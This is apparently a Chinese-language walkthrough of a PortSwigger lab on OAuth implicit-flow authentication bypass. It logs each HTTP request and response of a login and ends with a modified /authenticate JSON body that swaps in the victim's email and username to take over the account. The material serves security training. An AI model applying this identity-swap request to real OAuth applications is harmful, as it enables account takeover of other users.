




## OAuth 2.0 是如何工作的？

### OAuth 认证

实验：通过 OAuth 隐式流程绕过身份验证
https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow


1.  GET /my-account HTTP/2
    Host: 0a1c00e004a43912804c12c5004e00a0.web-security-academy.net

    HTTP/2 302 Found
    Location: /social-login

2.  GET /social-login HTTP/2
    Host: 0a1c00e004a43912804c12c5004e00a0.web-security-academy.net

    HTTP/2 200 OK
    Content-Type: text/html; charset=utf-8
    ```html
    <meta http-equiv=refresh content='3;url=https://oauth-0a4700ae0471399380bd10b702f6009a.oauth-server.net/auth?client_id=b26z1ui3bvgs3oh88d8yo&redirect_uri=https://0a1c00e004a43912804c12c5004e00a0.web-security-academy.net/oauth-callback&response_type=token&nonce=1216997183&scope=openid%20profile%20email'>
    ```

3.  GET /auth?client_id=b26z1ui3bvgs3oh88d8yo&redirect_uri=https://0a1c00e004a43912804c12c5004e00a0.web-security-academy.net/oauth-callback&response_type=token&nonce=1216997183&scope=openid%20profile%20email HTTP/1.1
    Host: oauth-0a4700ae0471399380bd10b702f6009a.oauth-server.net

    HTTP/2 302 Found
    X-Powered-By: Express
    Set-Cookie: _interaction=PxcxTb1bnHQqOdgOliQUH; path=/interaction/PxcxTb1bnHQqOdgOliQUH; expires=Tue, 11 Nov 2025 03:31:47 GMT; samesite=lax; secure; httponly
    Set-Cookie: _interaction_resume=PxcxTb1bnHQqOdgOliQUH; path=/auth/PxcxTb1bnHQqOdgOliQUH; expires=Tue, 11 Nov 2025 03:31:47 GMT; samesite=lax; secure; httponly
    Location: /interaction/PxcxTb1bnHQqOdgOliQUH

    Redirecting to /interaction/PxcxTb1bnHQqOdgOliQUH.


4.  GET /interaction/PxcxTb1bnHQqOdgOliQUH HTTP/2
    Host: oauth-0a4700ae0471399380bd10b702f6009a.oauth-server.net
    Cookie: _interaction=PxcxTb1bnHQqOdgOliQUH

    HTTP/2 200 OK
    ```html
       <div class="login-card">
      <h1>Sign-in</h1>
      
      <form autocomplete="off" action="/interaction/PxcxTb1bnHQqOdgOliQUH/login" class="login-form" method="post">
        <input required type="text" name="username" placeholder="Enter a username or email" autofocus="on">
        <input required type="password" name="password" placeholder="and password" >

        <button type="submit" class="login login-submit">Sign-in</button>
      </form>
      <div class="login-help">
        <a href="/interaction/PxcxTb1bnHQqOdgOliQUH/abort">[ Cancel ]</a>

      </div>
    </div>
    ```

5.  POST /interaction/PxcxTb1bnHQqOdgOliQUH/login HTTP/2
    Host: oauth-0a4700ae0471399380bd10b702f6009a.oauth-server.net
    Cookie: _interaction=PxcxTb1bnHQqOdgOliQUH

    username=wiener&password=peter


    HTTP/2 302 Found
    X-Powered-By: Express
    Location: https://oauth-0a4700ae0471399380bd10b702f6009a.oauth-server.net/auth/PxcxTb1bnHQqOdgOliQUH

6.  GET /auth/PxcxTb1bnHQqOdgOliQUH HTTP/2
    Host: oauth-0a4700ae0471399380bd10b702f6009a.oauth-server.net
    Cookie: _interaction_resume=PxcxTb1bnHQqOdgOliQUH


    HTTP/2 302 Found
    X-Powered-By: Express
    Set-Cookie: _interaction=PxcxTb1bnHQqOdgOliQUH; path=/interaction/PxcxTb1bnHQqOdgOliQUH; expires=Tue, 11 Nov 2025 03:31:58 GMT; samesite=lax; secure; httponly
    Set-Cookie: _interaction_resume=PxcxTb1bnHQqOdgOliQUH; path=/auth/PxcxTb1bnHQqOdgOliQUH; expires=Tue, 11 Nov 2025 03:31:58 GMT; samesite=lax; secure; httponly
    Set-Cookie: _session=PLc7PZzpfsy54SR2JD5vF; path=/; expires=Tue, 25 Nov 2025 03:21:58 GMT; samesite=none; secure; httponly
    Set-Cookie: _session.legacy=PLc7PZzpfsy54SR2JD5vF; path=/; expires=Tue, 25 Nov 2025 03:21:58 GMT; secure; httponly
    Location: /interaction/PxcxTb1bnHQqOdgOliQUH
    Content-Type: text/html; charset=utf-8

    Redirecting to /interaction/PxcxTb1bnHQqOdgOliQUH.

7.  GET /interaction/PxcxTb1bnHQqOdgOliQUH HTTP/2
    Host: oauth-0a4700ae0471399380bd10b702f6009a.oauth-server.net
    Cookie: _interaction=PxcxTb1bnHQqOdgOliQUH; _session=PLc7PZzpfsy54SR2JD5vF; _session.legacy=PLc7PZzpfsy54SR2JD5vF


    HTTP/2 200 OK
    X-Powered-By: Express
    Content-Type: text/html; charset=utf-8

    ```html
    <div class="login-card">
      <h1>Authorize</h1>
      <div class="login-client-image">
        <img src="https://0a1c00e004a43912804c12c5004e00a0.web-security-academy.net/resources/images/blog.svg">
      </div>
      <ul>
        <li><strong>WeLikeToBlog</strong> is requesting access to:</li>
        <ul>
            <li>Profile</li>
            <li>Email</li>    
        </ul>
      </ul>

      <form autocomplete="off" action="/interaction/PxcxTb1bnHQqOdgOliQUH/confirm" method="post">
        <button autofocus type="submit" class="login login-submit">Continue</button>
      </form>
      <div class="login-help">
        <a href="/interaction/PxcxTb1bnHQqOdgOliQUH/abort">[ Cancel ]</a>
        
      </div>
    </div>
    ```

8.  POST /interaction/PxcxTb1bnHQqOdgOliQUH/confirm HTTP/2
    Host: oauth-0a4700ae0471399380bd10b702f6009a.oauth-server.net
    Cookie: _interaction=PxcxTb1bnHQqOdgOliQUH; _session=PLc7PZzpfsy54SR2JD5vF; _session.legacy=PLc7PZzpfsy54SR2JD5vF

    HTTP/2 302 Found
    X-Powered-By: Express
    Location: https://oauth-0a4700ae0471399380bd10b702f6009a.oauth-server.net/auth/PxcxTb1bnHQqOdgOliQUH


9.  GET /auth/PxcxTb1bnHQqOdgOliQUH HTTP/2
    Host: oauth-0a4700ae0471399380bd10b702f6009a.oauth-server.net
    Cookie: _interaction_resume=PxcxTb1bnHQqOdgOliQUH; _session=PLc7PZzpfsy54SR2JD5vF; _session.legacy=PLc7PZzpfsy54SR2JD5vF


    HTTP/2 302 Found
    X-Powered-By: Express
    Set-Cookie: _interaction_resume=; path=/auth/PxcxTb1bnHQqOdgOliQUH; expires=Thu, 01 Jan 1970 00:00:00 GMT; samesite=lax; secure; httponly
    Set-Cookie: _session=16-QxcB8JSBLHMWcDoXT3; path=/; expires=Tue, 25 Nov 2025 03:22:03 GMT; samesite=none; secure; httponly
    Set-Cookie: _session.legacy=16-QxcB8JSBLHMWcDoXT3; path=/; expires=Tue, 25 Nov 2025 03:22:03 GMT; secure; httponly
    Location: https://0a1c00e004a43912804c12c5004e00a0.web-security-academy.net/oauth-callback#access_token=dqn9e2T6AT4OR5PR36D_gDDWjlUH9yfIUPSLL6ii-_T&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email
    Content-Type: text/html; charset=utf-8

    Redirecting to https://0a1c00e004a43912804c12c5004e00a0.web-security-academy.net/oauth-callback#access_token=dqn9e2T6AT4OR5PR36D_gDDWjlUH9yfIUPSLL6ii-_T&amp;expires_in=3600&amp;token_type=Bearer&amp;scope=openid%20profile%20email.


10. GET /oauth-callback HTTP/2
    Host: 0a1c00e004a43912804c12c5004e00a0.web-security-academy.net


    HTTP/2 200 OK
    Content-Type: text/html; charset=utf-8

    ```html
    <script>
    const urlSearchParams = new URLSearchParams(window.location.hash.substr(1));
    const token = urlSearchParams.get('access_token');
    fetch('https://oauth-0a4700ae0471399380bd10b702f6009a.oauth-server.net/me', {
        method: 'GET',
        headers: {
            'Authorization': 'Bearer ' + token,
            'Content-Type': 'application/json'
        }
    })
    .then(r => r.json())
    .then(j => 
        fetch('/authenticate', {
            method: 'POST',
            headers: {
                'Accept': 'application/json',
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                email: j.email,
                username: j.sub,
                token: token
            })
        }).then(r => document.location = '/'))
    </script>
    ```

11. OPTIONS /me HTTP/2
    Host: oauth-0a4700ae0471399380bd10b702f6009a.oauth-server.net

    HTTP/2 204 No Content
    X-Powered-By: Express
    Vary: Origin
    Access-Control-Allow-Origin: https://0a1c00e004a43912804c12c5004e00a0.web-security-academy.net
    Access-Control-Max-Age: 3600
    Access-Control-Allow-Methods: GET,POST
    Access-Control-Allow-Headers: authorization,content-type
    Date: Tue, 11 Nov 2025 03:22:04 GMT
    Keep-Alive: timeout=5
    Content-Length: 0


12. GET /me HTTP/2
    Host: oauth-0a4700ae0471399380bd10b702f6009a.oauth-server.net
    Authorization: Bearer dqn9e2T6AT4OR5PR36D_gDDWjlUH9yfIUPSLL6ii-_T
    Content-Type: application/json

    HTTP/2 200 OK
    X-Powered-By: Express
    Access-Control-Allow-Origin: https://0a1c00e004a43912804c12c5004e00a0.web-security-academy.net
    Access-Control-Expose-Headers: WWW-Authenticate
    Content-Type: application/json; charset=utf-8

    ```json
    {"sub":"wiener","name":"Peter Wiener","email":"wiener@hotdog.com","email_verified":true}
    ```

13. POST /authenticate HTTP/2
    Host: 0a1c00e004a43912804c12c5004e00a0.web-security-academy.net
    Content-Type: application/json
    Content-Length: 103

    ```json
    {"email":"wiener@hotdog.com","username":"wiener","token":"dqn9e2T6AT4OR5PR36D_gDDWjlUH9yfIUPSLL6ii-_T"}
    ```

    HTTP/2 302 Found
    Location: /
    Set-Cookie: session=OdMx59TSc58BgJiqIsNjNIqcFgblQ1Ew; Secure; HttpOnly; SameSite=None


14. GET / HTTP/2
    Host: 0a1c00e004a43912804c12c5004e00a0.web-security-academy.net
    Cookie: session=OdMx59TSc58BgJiqIsNjNIqcFgblQ1Ew

    HTTP/2 200 OK
    Content-Type: text/html; charset=utf-8


在第13.步
POST /authenticate HTTP/2
Host: 0abc00aa033f768982210681008c0009.web-security-academy.net
修改数据内容为目标用户
```json
{"email":"carlos@carlos-montoya.net","username":"carlos","token":"ZrxQ_xuPwffXJv3r_YoyzsSUMm_x6lIXxYB6bZaTTU0"}
```
作为目标用户登录

此处，在应用服务器与OAuth服务器验证后，应用程序服务器未保存令牌上下文状态